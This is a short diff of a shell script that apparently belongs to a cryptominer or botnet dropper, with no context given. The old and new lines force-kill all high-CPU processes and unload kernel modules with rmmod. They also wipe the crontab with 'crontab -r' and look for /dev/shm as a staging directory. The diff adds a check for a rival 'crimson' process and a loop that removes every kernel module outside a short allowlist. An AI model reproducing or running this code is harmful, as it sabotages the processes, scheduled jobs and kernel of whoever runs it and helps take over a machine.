@@ -1,9 +1,21 @@
 #!/bin/sh
 
-pkill -9 -f .evorip|pkill -9 -f .bandit|pkill -9 -f crimson
+if pgrep -f 'crimson' > /dev/null; then
+    exit
+fi    
+
 ps aux --sort=-%cpu | awk '$3 > 20 {print $2}' | xargs -r kill -9
 lsmod | awk '{print $1}' | tail -n +2 | xargs -r rmmod
 crontab -r
+
+a=("8189es" "vcodec_service" "drmboot")
+b=$(lsmod | awk 'NR>1 {print $1}')
+
+for c in $b; do
+    if [[ ! " ${a[@]} " =~ " ${c} " ]]; then
+        rmmod "$c" 2>/dev/null
+    fi
+done
 
 if [ -w '/dev/shm' ]; then
   export dir='/dev/shm'
